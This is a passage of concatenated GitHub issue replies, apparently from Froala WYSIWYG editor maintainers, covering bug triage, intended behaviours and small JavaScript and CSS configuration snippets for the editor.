order to be fixed: https://bugs.chromium.org/p/chromium/issues/detail?id=725464.. In order to display the &lt; and &gt; characters you should have to use their HTML. See: https://jsfiddle.net/msbwv6pb/1/.. To set an option after the editor was initialized, you would have to do it like this: \n<code>js\n$('.selector').data('froala.editor').opts.placeholderText = 'foobar';\n$('.selector').froalaEditor('placeholder.refresh');</code>. The default browser required cannot be used on the editor. If you want to implement a custom checker for an empty editor, you could use the <code>core.isEmpty</code> method.. @henningborchers would it be possible to send us the document you're copying from?. @henningborchers @sandeepsukhija there is going to be an update for all Office pasting over the following weeks.. This is the default behavior for all other custom types of elements: <code>img, input, button</code>. It is implemented this way because many users are looking to extend the behavior and also add attributes to the element on which the editor was initialized. If you are looking for a custom behaviour, you could use the following code to get only the content of the element the editor was initialized on:</p>\n<p><code>js\n$(selector).data('froala.editor').$oel.html();</code>. This has been added in V2.4.0. Please make sure you're using that version.. You should destroy the editor instance before replacing the HTML. See: https://jsfiddle.net/froala/br3gwtn0/5/.. That is because you are trying to put a DIV inside an A tag which is inside a P tag. P tags do not allow DIV tags inside them. For this scenario, it would be better to use the <code>enter: $.FroalaEditor.ENTER_DIV</code> option: https://www.froala.com/wysiwyg-editor/examples/enter. It appears to be missing from the documentation. There is a 4th parameter response for the save.error event.. It's updated.. That is because you have removed the <code>SCRIPT</code> tag from the <code>htmlRemoveTags</code> option. It is the intended behavior with <code>htmlRemoveTags: []</code>.. Unfortunately, this is a problem of the browsers on mobile, mainly because of the predictive keyboard. Same problem can be easily reproduced on https://jsfiddle.net/xmtmg5kn/3/. We'll report it further to see if we can get the browser developers to fix it.. It's on our list. We'll make a plugin for it shortly.. This was initially marked as an issue, however at a closer check, it appears that the behavior is correct. You have the the following structure:\n<code>html\n&lt;div class=\"wrap3 fr-inner\"&gt;\n  &lt;blockquote&gt;\n     &lt;p class=\"inner\"&gt;Blockquote inner text.&lt;/p&gt;\n  &lt;/blockquote&gt;\n&lt;/div&gt;</code>\nSince you're using the <code>fr-inner</code> class, that doesn't allow to make changes outside of them. They are like a black box and allow editing only inside them. </p>\n<p>Also, the editor is designed to split the <code>blockquote</code> in two when you hit enter inside them. That is the behavior we consider as being correct.. It is fixed on master now.. The editor is not doing any changes on how the images are being taken. The editor only uploads the images and then they are being served back. I believe that somehow there are some other infos there on the phone that aren't passed.. @jamesmoss we are just loading in the editor the image which has been uploaded to the server as SRC to the image. I believe the right way of doing this would be to make changes to the image on server side when it is stored instead of client side when the image is being loaded.. @steve-tapley we're taking this into consideration, however, I don't have a response yet.. @dobon this is in our attention and most likely we're going to create a plugin specially for that. Unfortunately, I don't have an ETA to share at this moment.. It is already on our roadmap: https://wysiwyg-editor-roadmap.froala.com/public/ideas/4174. Would be extremely helpful if you can upvote it there.. @ncmancuso @kmacampbell are you doing anything else before that because we cannot reproduce this problem?. We couldn't reproduce this in anyway. I am closing this until there is a consistent way of getting it reproduced.. @shorttylad could you make a jsFiddle for this?. Would it be possible to make a recording?. That is the intended behavior. The editor is designed to remove BR tags at the end of the block tags (e.g. DIV, P, H1, H2, etc.) when there is text inside that block tag.. There doesn't appear to be any problem from the editor: https://jsfiddle.net/froala/1otp8rdt/.. For tech support, please reach us via our website: https://www.froala.com/wysiwyg-editor/contact.. Thanks for reporting this. I am going to close this here since it is a duplicate with the one from the Angular repo.. @ferdaousharmel please upgrade to the latest version 2.7.1. Thank you.. @johnstonmatt please make sure that you are not including the forms plugin. The forms plugin is the one responsible for interacting with inputs.. It is fixed on the current master.. It's already fixed on master.. I am adding some clarification here after we tested it. To reproduce this problem we should:\n- insert an emoticon\n- hit backspace\n- insert a new emoticon. @GMiLL5 by disabled do you mean that you have called <code>edit.off</code> method?. For the moment we do not support Windows Phone officially. This is in our attention, however I am going to close it for now here.. There is a reg ex in place that is designed to filter what code is allowed to be embedded. If you want to allow other tags, then you could change the following like of code and include it just before initializing the editor:</p>\n<p><code>js\n$.FroalaEditor.VIDEO_EMBED_REGEX = /^\\W*((&lt;iframe.*&gt;&lt;\\/iframe&gt;)|(&lt;embed.*&gt;))\\W*$/i;</code>. @ncmancuso thanks for the suggestion.. @daisylaflamme you can change the <code>enter</code> option to <code>$.FroalaEditor.ENTER_BR</code> in order to avoid this problem.. It's fixed on master.. Thanks for the feedback! However, one of the core things we're designing the editor on is \"a true WYSIWYG\". This is the reason why if someone sees an empty line while editing that line should be kept when the HTML is saved as well. . Done. Thanks @Panman8201 !. @IrinaIrwin we just tested this and it appears to work just fine. Could you please provide a jsFiddle?. @IrinaIrwin we tried this again and were able to reproduce it. The problem comes from a CSS conflict with the <code>container</code> class we're using on the website as well. I would recommend you to enable the <code>fullPage</code> option for your case.. @ChinesePeanuts Please make sure you're using the latest 2.4.1 version. We cannot replicate it there. . @Panman8201 Unfortunately, it's not possible to do a trigger for that. There are some libs which simulate typing inside inputs, however they produce unexpected outputs and you won't get something consistent.. Yes, that should work. You can use the following to easily set some HTML: <code>$('#editor').data('froala.editor').$el.html('your_html');</code>.. Duplicate of #1715 . It is fixed on the current master.. Thanks for the suggestion, @monolithed.. This is behaving incorrectly by wrapping the <code>LI</code> in a span actually. I marked this as an enhancement and we'll review it.. This has been fixed in a recent commit on master.. Updated.. It will come in the following hours.. You can download it from Github for now and shortly it will be available on our website too.. @440459012 They will be available inside your account as soon as we make the official release in couple of hours.. It's fixed on master.. It is fixed on the current master.. @KarolMilewski you could add a CSS rule like this: \n<code>css\n.fr-view a {\n  text-decoration: none;\n}</code>. Are you using <code>useClasses: false</code>? Also, that line might appear from the following: http://stackoverflow.com/questions/814366/how-can-i-remove-the-outline-around-hyperlinks-images.. See http://stackoverflow.com/questions/814366/how-can-i-remove-the-outline-around-hyperlinks-images. Most likely that is causing the underline.. This looks like a config problem and not a bug. Please contact us via support if you have a license that includes tech support for more help.. We consider this as being the correct behavior. It should disappear because is under the image and the image passes the bottom of the editor.. It is marked as an <code>enhancement</code> because when you copy from the browser, there is an empty paragraph copied because the selection is ending at the end of the previous paragraph. . @mukk85 that is the intended behavior when you are using enter: <code>$.FroalaEditor.ENTER_P</code>. If you don't want them, then use <code>$.FroalaEditor.ENTER_BR</code>. https://www.froala.com/wysiwyg-editor/examples/enter. @JSteunou could you please make a recording?. It's already fixed here on the master branch.. Duplicate of https://github.com/froala/wysiwyg-editor/issues/1572#issuecomment-259158876.. It's fixed on master.. If you don't want to have them joined together, you could put them a different ID and the editor will keep them separate.. You're not using V2.4.2 for the editor most likely because this problem cannot be reproduced here: https://www.froala.com/wysiwyg-editor/examples/enter.. @will-newmarch could you please make a jsFiddle?. The image is insert as link and in this case it shouldn't be uploaded. We consider the current behavior as being the correct one.. Dragging it there is like inserting the image via URL or pasting it and it should not be uploaded.. I understand that it might not work for all cases, but images dropped this way cannot always be uploaded. If they are private or from a different domain, the browsers do not allow to access them for being uploaded.. Google Docs has their built-in rendering engine which might make such things possible. . There is a CSS rule that you could remove:</p>\n<p><code>css\n.fr-wrapper ::selection</code>. Please find it in action here: https://www.froala.com/wysiwyg-editor/examples/full-featured. Oh, we should update it.. @monolithed what do you mean by \"toolbar specifiers\"?. If you click on the toolbarButton it will get you to the docs where all the options are: https://www.froala.com/wysiwyg-editor/docs/options#toolbarButtons. Please make sure you have included the language file. If you still have problems please <a href=\"https://www.froala.com/wysiwyg-editor/contact\">reach tech support</a> if you own an Advanced/OEM license. . You should include the language translation file as it explains on the link you sent as well:\n<code>html\n&lt;!-- Include the language file. --&gt;\n&lt;script src='../langs/es.js'&gt;&lt;/script&gt;</code>. Please see: https://github.com/froala/wysiwyg-editor/issues/1235#issuecomment-251943999.. It is possible to do that only if you are using a <code>&lt;span style=\"white-space: nowrap;\"&gt; &lt;/span&gt;</code> for those spaces that you want to stay together. Other way, the editor will alternate them with regular spaces to improve typing.. @monolithed Thank you for this!. jQuery sortable requires to have <code>text-selection: none</code> on the element that is being dragged, while the editor needs <code>text-selection: auto</code>. To integrate jQuery Sortable with Froala Editor, you can use a handler to move the elements that contain the editor.. @binod12 are you able to reproduce that on our website?. Unfortunately, not. For tech support, please reach us via our website.. Sure:</p>\n<p><code>Returning false in the handler assigned to the event will cancel the current action.</code>. Closing this as duplicate of #1762.. @abologna-r7 it should have been #1907. Sorry for the confusion.. It was fixed on master few days ago.. @pelizza it's a new plugin we're planning to add in shortly and we're gathering some feedback now.. @otaviomedeiros yes, there will be a release in couple of days.. @JSteunou Could you please provide few more details? We cannot reproduce it.. If you want to do that, the best way would be to use the paste.beforeCleanup event and make the changes you need on the HTML.. At this moment we support the following video providers for inserting via URL: Youtube, Vimeo, DailyMotion, Yahoo, Rutube and Vidyard. There is no option for using MP4 links.. The <code>input</code> event is being triggered only if it is not being stopped by other actions inside the editor. If you want to have it triggered before the editor actions, you should use the https://www.froala.com/wysiwyg-editor/docs/methods#events.on and use the <code>first</code> parameter. It's best to use the <code>initialized</code> event and bind your listener inside the callback, like this:\n<code>editor.events.on('input', function () { ... }, true);</code>.. It has been fixed here last week and will be updated on the public website shortly.. This is the correct behavior as the <code>contentChanged</code> event is not designed to be triggered immediately but only when the user makes a pause while typing. This is mainly for performance reasons.. @danielgranat Thanks for the PR. We don't merge them directly here, however we made a commit with this fix. \ud83d\udc4d . @JSteunou we are using https://github.com/umdjs/umd/blob/master/templates/jqueryPlugin.js, which has exports for CommonJS therefore that should work. Do you have any insights?. Please see: https://www.froala.com/wysiwyg-editor/docs/options#imagePasteProcess. @mpatelj this doesn't happen on our website. Please make sure you have your Edge version up to date and Froala Editor as well.. @dswitzer could you please make a recording? I just tried to reproduce it, but looks good to me.. @dswitzer thanks for the additional details. We were able to reproduce it and now we're fixing it. :). @dswitzer could you check with the current master? It should be fixed. Thank you.. That is a paperclip which shows that the link is a file. If you want to disable this, you could use the following CSS rule:\n```CSS\n.fr-view .fr-file::after {\n  content: \"\";\n}. We're using the default browser character for that, we don't make any changes to it.. We couldn't reproduce this with the current master.. Couls you please make a recording?</p>\n<p>Stefan</p>\n<p>Sent from my iPhone</p>\n<blockquote>\n<p>On 22 Mar 2017, at 19:50, J\u00e9r\u00f4me Steunou <a href=\"&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#110;&#111;&#116;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#115;&#64;&#103;&#105;&#116;&#104;&#117;&#98;&#46;&#99;&#111;&#109;\">&#110;&#111;&#116;&#105;&#102;&#105;&#99;&#97;&#116;&#105;&#111;&#110;&#115;&#64;&#103;&#105;&#116;&#104;&#117;&#98;&#46;&#99;&#111;&#109;</a> wrote:</p>\n<p>I still reproduce it when following the steps to reproduce the issue.

Yes, we tried just the same steps. Maybe you can record with another device.. @JSteunou @TK-one could you please try to record the screen? Thank you.. @dswitzer could you please send us the Word document you're using.. Closing this as we're tracking it offline.. You could use <code>image.get</code> method to get the current active image inside the editable area.. We're going to close this for now and reopen it if there is more interest on that. Most likely this feature would get implemented together with image multiple files upload.. This is a problem from jQuery validation plugin: https://github.com/jquery-validation/jquery-validation/issues/1835. This looks like a problem from your side. Please contact us via our website for tech support.. @yivo are you using <code>htmlUntouched</code> option?. The <code>htmlUntouched: true</code> option cannot be used together with the <code>useClasses: true</code> because useClasses convert the inline style to classes for images which you don't want because of the htmlUntouched.. @celalnuriakgun please reach us through our website for tech support. Thank you.. @cshehadi are you able to reproduce this on our website? If so, you could please provide few more details?. I marked this as a feature request, however it is unlikely to have this added.. @jeremylynch could you please let us know where you're copying from? Thank you.. This should be fixed on the current master.. At this moment the editor requires the jQuery dependency.. Sure: https://wysiwyg-editor-roadmap.froala.com/public/ideas/3597.. Please upgrade to at least v2.4.2.. Do you have a page to test it?. Please find more about that here: https://www.froala.com/wysiwyg-editor/docs/concepts/save/button.. @irphilli Are you able to reproduce it here? https://www.froala.com/wysiwyg-editor/examples/full-featured. If yes, then could you please provide few more details?. Same thing applies to videos that are uploaded by the editor. . Closing as it is duplicate of #1820.. @celalnuriakgun for tech support please reach us via our website. Thank you.. @binod12 we just checked this and it doesn't appear to be an issue. When the image is alone in the editor, you can add a new line by clicking the image and hitting enter, or click above/below it. . We can confirm there is a problem with this, it looks somehow the default behavior for print is not being stopped. Until we fix this, as a workaround, we would suggest changing the shortcut for the image: https://www.froala.com/wysiwyg-editor/docs/concepts/custom/shortcut.. @binod12 Microsoft says this behavior is by design and cannot be changed: https://support.microsoft.com/en-us/help/3167077/browser-default-action-for-ctrl-p-cannot-be-prevented.. You could bind to the drop event inside the editor and return false to prevent all the dropping chain:\n<code>js\n$(selector).on('froalaEditor.initialized', function (e, editor) {\n  editor.events.on('drop', function () {\n    return false;\n  }, true);\n});. It's fixed on the current master.. `video.removed` doesn't return the video itself, but the wrapper of the video. It looks like this: `&lt;span class=\"fr-video\"&gt;VIDEO_OBJECT_HERE&lt;/span&gt;`.. Duplicate of #1432. We are in the process of integrating a 3rd party spellchecker and should be available pretty soon.. For that please use: https://www.froala.com/wysiwyg-editor/docs/options#keepFormatOnDelete.. Could you please provide a jsFiddle?. By default the editor is injecting inside the iframe the styles found in CSS files. If you don't want those styles, then you should remove the CSS rules from the files.. It looks like you don't have the video plugin version aligned with the main version.. It should be fixed on master.. The code triggers the event if it is not being stopped by another listener. If you want to have your code called first, you should do the following:</code>js\neditor.events.on( 'keyup', function( ) {\n   console.log( 'keyup' );\n}, true);\n<code>``. There might be other places where the keyup event is being stopped.. That is exactly what we're doing when that is possible. The problem is that not all the times you can find the images in the RTF, or there are cases when the RTF doesn't get to the clipboard at all.. Could you send us the document you're pasting from?. @dswitzer what browser and OS are you testing on?. @dswitzer Thanks. What OS?. It's fixed on master.. You can use the destroy method to turn off the editor. To get it back into the state before initOnClick, you should reinitialize it.. It is, but has a different name:</code>edit.off<code>. Please see: https://www.froala.com/wysiwyg-editor/docs/migrate-from-v1.. @renatosousafilho for tech support please reach us via our website: https://wysiwyg-editor.froala.help/hc/en-us. It looks like this is an error from</code>gulp-css-import<code>rather than from Froala Editor. The editor CSS files are regular CSS files, nothing special there.. Sure, please see: https://www.froala.com/wysiwyg-editor/docs/options#typingTimer.. Under 500 you would kill browser performance.. Thank you for the suggestion. Image figure is on our TODO list already. We do not keep feature requests here on Github, therefore I am closing it for now.. We don't have an ETA for it at this moment.. Just a quick update here. The last commit is adding image caption feature. . Just update to version 2.7.0 and you'll find it in the Image Edit popup. There is also a demo on our website: https://www.froala.com/wysiwyg-editor.. This doesn't look like an editor problem but rather a CSS conflict inside your app. Please reach us via our website for tech support.. @Anexon please make sure you are including the</code>froala_style.min.css<code>file and that you are using the latest editor version.. Duplicate of #1827 .. @starceaker that has been closed as part of a commit we made in the editor. Should be fixed in version 2.6.0.. Unfortunately, in the current implementation of the editor dropdowns that is not possible. I marked it as a</code>feature-request<code>and it is in our attention for further iterations.. Right, the cells should deselect and delete key should work as usually.. This should be fixed on the master version.. This is not built-in at this moment, however you could create some custom buttons for that. You can find something similar here: https://wysiwyg-editor.froala.help/hc/en-us/articles/115001232345-Add-button-for-H1-and-H2-in-the-editor-toolbar.. This is the designed behavior. Quotes are considered block tags and like headings they are not removed using the Clear Formatting button.. Allowing to exit from fullscreen using</code>ESC` is not a good thing speaking for accessibility and UX. ESC is designed to close modals and popups inside the editor so it would create confusion to have it do that for fullscreen. . It is published now. We usually publish it 2-3 days after the official release is made on our website.. The Calibri font family doesn't show up because Calibri font is not loaded on the browser. The fonts from Word would be rendered exactly only if they are loaded on the page as well.</p>\n</blockquote>\n<p>We're going to make some further checks for the table problem. . This is the intended behavior. The nested lists should be inside another list item tag in order to be valid HTML.. @thonglee MS Word, Google Docs, etc. are not generating HTML valid out of it and that's why the list indentation works differently at them. We consider the behavior we currently have in the editor as the best one for generating a valid HTML output.. For this moment we consider this a <code>feature-request</code> and might be implemented in the following period.. @IndrajaPunna I don't have an estimate to provide for this at this moment.. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. We consider this a correct behavior. The images are designed to take the maximum width of the parent.. This is the intended behavior. All the html code which is put inside the code view should be rendered on editing view.</p>\n<p>Please read more about it here: https://wysiwyg-editor.froala.help/hc/en-us/articles/115000428829-Why-is-the-script-tag-being-removed-.. @drdaemos makes sense. I marked this as an <code>enhancement</code> and we'll put an option for it.. @drdaemos this should be fixed in version 2.8.1.. Could you send us the config you're using for the editor?. @mpatelj could you please let us know what HTML you have in the editor? Or is it empty?. @mpatelj this seems to be a problem from CodeMirror. Please use their version <code>5.25.0</code> instead of <code>5.3.0</code>.. You could use the <code>htmlDeniedTags</code> for that.. @jeremylynch no, it shouldn't because there might be cases when someone wants to use the ARTICLE tag.. @irphilli please make sure you are using the master version. It is fixed on the master version.. @nikita-korovin thank you for the <code>feature-request</code> on this. We use this repo for bug tracking only, therefore I am going to close this for now.</p>\n<p>At this moment there is no way in the editor to take the information you're looking for.. @AMC would you mind opening this issue on the PHP SDK: https://github.com/froala/wysiwyg-editor-php-sdk? Thank you.. @jeremylynch are you able to reproduce this on our website?. What browser and OS are you using?. It is not an issue. When using the URLs plugin, the editor is designed to convert texts which are links to <code>&lt;a&gt;</code> tags.. It is working fine on our checks. Could you please clear your cache? Thank you.. Closing this as we discussed the problem further on email and it's editor related.. This is the intended behavior.. @kartikbb are you having the editor hidden initially? If so, then it is a duplicate of https://github.com/froala/wysiwyg-editor/issues/1449.. It doesn't look like a problem from the editor. According to the W3C specs, only a body tag is allowed inside a HTML page. By default, the browser should remove the BODY tag from SVG tag. How are you initializing the editor in order to keep it?. @warpdesign could you make a jsFiddle?. @warpdesign We have tried to insert somehow that SVG on the page, but nothing seems to work. The fix to be applied inside the editor code seems pretty basic, however we cannot just make it without having the possibility to test this. If you can find a way to have such a SVG structure inserted, we would be happy to reopen this and look into it.. Last commit fixes it.. There are special options for Word paste:\n<code>js\n   wordDeniedTags: [],\n   wordDeniedAttrs: [],\n   wordAllowedStyleProps: ['font-family', 'font-size', 'background', 'color', 'width', 'text-align', 'vertical-align', 'background-color']</code>. @theknet could you please make a recording for this?. It is happening because of the Mozilla limitation on table selection.. @GMiLL5 could you please make a jsFiddle for it? Thank you.. @GMiLL5 thanks for sharing that. Are you still seeing this problem in the latest editor version?. If you want to use <code>FORM</code> tag inside the editor, then it is best to enable the <code>iframe: true</code> option. . This is the intended behavior. The alignment should be applied to the inner contents of the element.. Closing this because steps to reproduce were not provided.. @pawansingh-snapwiz could you please use <a href=\"https://jsfiddle.net/froala/wc5c3jhk/\">this basic jsFiddle</a> to highlight the problem?  Thank you in advance.. See: https://github.com/froala/wysiwyg-editor/issues/1235#issuecomment-251943999.. Sure, there is an example for it on our website: https://www.froala.com/wysiwyg-editor/examples/custom-popup.. That is because there is another event which is triggered before and prevents the keydown to propagate. If you would like to subscribe and be the first who catches the key, you should do it like this:</p>\n<p><code>js\n$(selector).on('froalaEditor.initialized', function (e, editor) {\n  editor.events.on('keydown', function () { ... }, true);\n}).froalaEditor();</code>. This should be fixed on master.. On master, it is designed to follow the protocol of the page, by using <code>//:</code>.. There are different options for fileUploadURL and imageUploadURL.. As a clarification, the document should be opened with Preview on MacOS.. Should be fixed on the current master.. @jeremylynch we've tried to reproduce it without success. Could you please make a recording?. Yes, we cannot reproduce it on master version.. Thank you for the suggestion.. Browser default behavior is to focus at the end: https://jsfiddle.net/tgnaduwz/. We're going to keep it the way it is now.. That is because the modal has a higher zIndex than the editor. Changing it would fix the problem right away. https://jsfiddle.net/z8uv8jtj/1/. There is actually one in our examples: https://github.com/froala/wysiwyg-editor/blob/master/html/3rd-party/bootstrap/modal.html. It appears to work just fine. Are you having the problem with this example or could you provide a jsFiddle?. Thank you for the suggestion, we'll discuss about it.. Unfortunately, that is not possible, the image has to be loaded somewhere in order to be uploaded. . It is not related to the other issue. Please make sure you are including the editor JS main file before the plugins.. There doesn't appear to be any problem: https://jsfiddle.net/3tcm0kqh/.. Tab is designed to add spaces, not to decrease it. Anyway, thank you very much for the suggestion.. What browser and OS are you using? Could you send us a link to a place where we can reproduce this? Thank you.. @jeremylynch we couldn't reproduce it. Please use the following files for creating the jsFiddle:\nhttps://cdn.rawgit.com/froala/wysiwyg-editor/44fc7c52/js/froala_editor.pkgd.min.js\nhttps://cdn.rawgit.com/froala/wysiwyg-editor/44fc7c52/css/froala_editor.pkgd.min.css. @jeremylynch we cannot reproduce it. I believe it is mainly related to a CSS conflict with something else you have there on the page. If you could put together and example it would be great.. Could you please let us know the exact steps to reproduce it? Also, please follow the layout for reporting an issue, that helps to get it fixed faster.. I understand your point, however this is unlikely to be added as an option built-in very soon because of the way the dropdowns are now designed. I am marking this as a <code>feature request</code> and it is in our attention.. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. @PDiddyStyleShrimpingVessel would it be possible to send us the document you're copying from? Also, are you experiencing that on our website as well?. Great suggestion!. Last commit adds the option <code>videoAllowedProviders</code> where you can specify which ones to choose. More details will be added on our website as soon as we make the official release.. @robnelson There will be a release in the following days.. @Pyro979 @jeremylynch unfortunately, at this moment Microsoft Edge doesn't get the HTML correctly from Word. We're going to report this over to Microsoft to see if we can get them fix it somehow.. You can use the drop event and prevent propagating it: https://www.froala.com/wysiwyg-editor/docs/events#drop.. Most likely you are doing something incorrectly. For tech support please use our website: https://wysiwyg-editor.froala.help/hc/en-us. At this moment we don't have such a feature.. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. Please make sure you're using the latest version of the editor as it is already doing that.. This is not reproducible on the current master version.. Probably it makes sense to do that after those elements which are not editable, such as table, images or videos. Great suggestion!. @george-norris-salesforce we've just put an update for it. It is designed slightly different, when you click at the bottom / top of the space that's left there between the editor edges and last element a new line would get inserted. It is not necessary to include the line breaker tool.. @pijulius  It is not reproducible in the current master version of the editor. Could you please make a jsFiddle? Thank you.. There doesn't appear to be a problem in the current master. Please make sure that you are binding to the contentChanged event correctly. It should be something like this:</p>\n<p><code>js\n$('selector').on('froalaEditor.contentChanged', function (e, editor) {\n}).froalaEditor();</code>. Unfortunately, there is no too much we can do about it as it is a Firefox problem: https://bugzilla.mozilla.org/show_bug.cgi?id=226301. There appears to be a workaround, but it doesn't work: http://stackoverflow.com/a/10903605/1806855. Please make sure you are including the froala_style CSS file.. @an0nh4x0r could you please make a jsFiddle or something similar?. The documentation had a small problem there. The <a href=\"https://www.froala.com/wysiwyg-editor/docs/events#video.uploadedToS3\">video.uploadedToS3</a> event shall be used as an alternative.. There was an error in our docs. There is no such plugin <code>language.min.js</code>. If the language doesn't work for you , then most likely you are not including the language file correctly.. @danniehansen could you please make a jsFiddle?. We are closing this due to lack of response.. It is fixed on the current master.. We cannot reproduce it. Could you please send more details. What URL are you using? Where are you pasting it?. Closing this here and we're going to discuss via email.. Most probably you are not setting it correctly. See: https://github.com/froala/wysiwyg-editor/blob/master/html/3rd-party/bootstrap/modal.html.. @jungyoungtai could you send us an Excel file for that?. @jungyoungtai could you send an excel file? Thank you.. We haven't got it. Could you please upload the Excel file somewhere and put the link here?</p>\n<p>Thanks.. It is already fixed on the master version.. Yes, but it is fixed on the master version of the Github repo. We do here the development and put updates on our website only after a new release is made.. Pasted images which have the SRC set to a URL shouldn't be uploaded. In V2, pasted images are uploaded automatically to the <code>imageUploadURL</code> option.. @raghuramv1988 it works with any version higher than 1.11.0. . @fernandoacosta please make sure you don't have parent elements which have CSS property <code>overflow: hidden</code>.. Yes, that is because we have there an <code>overflow: hidden</code> on the page in a parent element - we're going to update it shortly. That is not happening on the homepage, where that CSS property is not used.. @jpgilchrist could you please put together a jsFiddle for it?. We reviewed this and the math looks correct. The top where the element should be displayed (<code>p_offset + top</code>) added with the height of the element (<code>height</code>) shall be higher than the height of the offset of the scrollableContainer (<code>editor.$sc.offset().top</code>) added with the height of the container (<code>s_height</code>). </p>\n<p>I might be wrong, therefore if you could put together a CodePen or jsFiddle to show what is wrong, we could definitely look more into it.. @jobnoam could you please put together a jsFiddle? Thank you.. We're closing this due to lack of response.. @celalnuriakgun Please make sure you have the correct path set up. If that is going on your development environment, that is unlikely to be a problem from the editor. For tech support please reach us via our website.</p>\n<p>Thank you,. Most probably you're setting it incorrectly. Please reach us via our website for tech support about configuring the editor. Thank you.. @carolynmills please make sure you're using the latest editor version.. @carolynmills on our website keepFormatOnDelete option is not enabled and that's why you see this behavior.. We have an example for that as base64: https://github.com/froala/wysiwyg-editor/blob/master/html/image/insert_base64.html#L89. @PvanHengel please see: https://github.com/froala/wysiwyg-editor/issues/1235#issuecomment-251943999.. The editor is using HTML 5 underneath and editor's output is HTML5 as well. In HTML5, it is not necessary to have an ending / for self-closing tags.. Please make sure you are loading the froala_style CSS file from the same domain. If you cannot do that, then pass it to the <code>iframeStyleFiles</code> option.. At this moment we don't have an option for that. I marked this as a <code>feature-request</code> and it is going to be added if we get more requests for it.. @bartezic could you please let us know what HTML you have there?. @bartezic we just tried it and appears to work just fine. Could you please make a codePen for it. You can use the following as a starting point: http://codepen.io/Froala/pen/PpgxGL. @dalezak Indeed, there are some CSS style which are applied inline, however they are required in order to enable rich features. Positioning UX elements require setting left/top CSS properties and setting the style inline is the most convenient way.\n. As far as I know, that wouldn't be possible because the editor would require to apply dynamic CSS properties such as top/left and those are always different. . @PvanHengel could you please send us an app where we can test it?. We are closing this due to lack of response.. Yes, on Github master it is fixed.. Last commit adds the <code>wordPasteModal</code> option which is a boolean. By default it is true and can be set to false. In this case the format would be kept. If Word format is not desired, then the Word Paste plugin shouldn't be included at all.. Hi @largeden. Yes, this is the intended behavior and it was added in order to fix some problems with the inline toolbar not showing correctly on mobile devices.. We just tried to reproduce it with that CodePen, but it appears to work just fine, no error is being thrown.. See: https://github.com/froala/wysiwyg-editor/issues/1949#issuecomment-302407484 for disabling the option.  </p>\n<p>Translation for it can be added in translations file as well.. @jpgilchrist are you using V2.6.0? This problem is not happening there.. This appears to work just fine on the current master. Could you please provide a place where we can reproduce this with the master version?. Closing this due to lack of response.. Please use it like this so that it gets triggered before other editor events:</p>\n<p><code>``js\n$('selector').on('froalaEditor.initialized', function (e, editor) {\n  editor.events.on('drop', function () {\n  }, true);\n}).froalaEditor();. @ghedwards it's going to be updated on our website as well.. It is a side effect of an issue we fixed. We're going to make all the necessary corrections for it in docs in the following hours.. Please find details for binding to drop event here: https://www.froala.com/wysiwyg-editor/examples/drop-content. When the font-size is changed for a list item, there is inline style being applied. Unfortunately, that is not possible to be done for list bullets. One possible approach would be to apply the font size directly on the list item, but that means that the content should be wrapped with another tag if there is inline style and it would result in a very messy HTML.. @tmpg this should be fixed now here on Github and we'll update our website by the end of this week.. This should be fixed on the current Github master.. @raerae13 this works correctly in our tests. Could you please make a jsFiddle or CodePen to reproduce this?. The problem on jsFiddle is coming from the fact that the</code>froala_style.css<code>file is not included from the same URL as the JS. Copying it to the STYLE directly in jsFiddle fixes it: https://jsfiddle.net/6h7xcqdy/2/.. @apoktechnology are you experiencing that on our website? Please make sure you are using the latest version 2.6.0.. Hi @bboyle! We consider this as being the correct behavior and it's unlikely to make the change you are suggesting. That is the way most of Word processors and Email clients works.. @JSteunou we don't consider this as being a real problem because the selection is outside of the</code><em><code>tag and returns the correct element. If you would like to get it more specific, I would recommend working directly with the range by using</code>selection.ranges()` method.. Yes, there is some logic there behind for the cases when you hit enter &amp; backspace in order to scroll the editor contents correctly. If you could provide a jsFiddle we could definitely look into it. </p>\n<p>Please make sure you are using version 2.6.0 which is the latest.. At this moment that is not possible. I am adding this as a <code>feature-request</code>.. We've just put together a public roadmap with the most popular features. \ud83d\ude0d There you can vote your favorite one, provide feedback or make new suggestions: https://wysiwyg-editor-roadmap.froala.com/public.. https://www.froala.com/wysiwyg-editor/docs/options#emoticonsUseImage. @starceaker please make sure you are using editor version 2.6.0 which is the latest. Also, please make a plunker where we can reproduce this. Thank you.. @starceaker no problem. Thanks for confirming it!. For problems with including the license, please reach us via our website support. Thank you.. @mjniday please make sure you have jQuery defined globally. It should be something like this: https://github.com/froala/react-froala-wysiwyg#2-make-sure-you-have-the-right-webpack-settings-for-loading-the-css-files-font-awesome-and-jquery.. Not sure of that. Does it work if you add <code>window.$ = jQuery;</code>?. @cksachdev the unminified JS for the editor is available only under the Advanced and OEM licenses.  You can find more details about creating a plugin on our website: https://www.froala.com/wysiwyg-editor/docs/concepts/custom/plugin.. Inside the docs from our website, you can find more resources: https://www.froala.com/wysiwyg-editor/docs.. @maxthet604 it looks like somehow the editor is not being loaded on the global jQuery variable. It would be amazing if you could put together a simple Electron app that we can get and help you fix this.. @maxthet604 you should do it like this:\n```html\n  <!-- Insert this line above script imports  -->\n  <script>if (typeof module === 'object') {window.module = module; module = undefined;}\n\n\n\n Insert this line after script imports \nif (window.module) module = window.module;\n```\nSee more details here: http://stackoverflow.com/a/37480521/1806855.. Yes, you can do it like this:\njs\neditor.opts.imageUploadURL = '/my/new-url';. It appears to work just fine on the current master version.. Inserting table via Quick Insert tool is designed not to fire the commands.after because those are not regular buttons inside the editor. I marked this as a feature-request and is going to be implemented together with the possibility of adding custom buttons inside the Quick Insert tool.. @wrporter we are not able to reproduce it. Could you make a jsFiddle?. @suryaiiit you are not using the latest editor version. Please upgrade to V2.6.0.. You should pass popup: true as an option for the button inside the popup. If you are using the default buttons, then it would be best to do something like this:\njs\n$.FroalaEditor.COMMANDS.insertImage.popup = true;. Yes, that applies to all editor instances because this is how button actions are defined in the editor. For a single instance, it would be best to define custom buttons for those actions.. The current behavior is correct. The refresh methods for buttons are called only for buttons which are visible (the ones from your popup are not initially). It is best to make them inactive when you show the popup if codeView is active.. We consider this as being out of the editor's scope. We would recommend to use a 